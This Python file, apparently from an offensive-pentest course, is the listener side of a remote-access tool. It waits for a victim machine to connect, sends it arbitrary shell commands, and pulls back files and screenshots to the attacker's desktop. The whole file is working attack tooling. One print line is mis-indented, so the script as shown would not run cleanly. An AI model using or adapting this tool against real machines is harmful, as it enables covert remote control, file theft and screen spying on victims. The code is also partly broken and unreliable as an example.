# Python For Offensive PenTest:
# Screen Capture
# Server.py

import os
import socket

ip = "172.25.191.60"
port = 8080

def transfer(conn, command, operation):
    conn.send(command.encode())

    if (operation == "grab"):
        grab, path = command.split("*")
        f=open('/root/Desktop/'+path, 'wb')

    if(operation == "screenCap"):
        fileName = "screenCapture.jpg"
        f=open('/root/Desktop/'+fileName, 'wb')

    while True:
        bits = conn.recv(5000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
            f.close()
            print ('[+] Transfer completed')
            break
        if 'File not found'.encode() in bits:
            f.close()  # not in directions
            print ('[-] Unable to find out the file')
            break
        f.write(bits)

     print("File written to: /root/Desktop")


def connecting():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command, "grab")
        elif 'screencap' in command:
            transfer(conn, command, "screenCap")
        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connecting()
main()
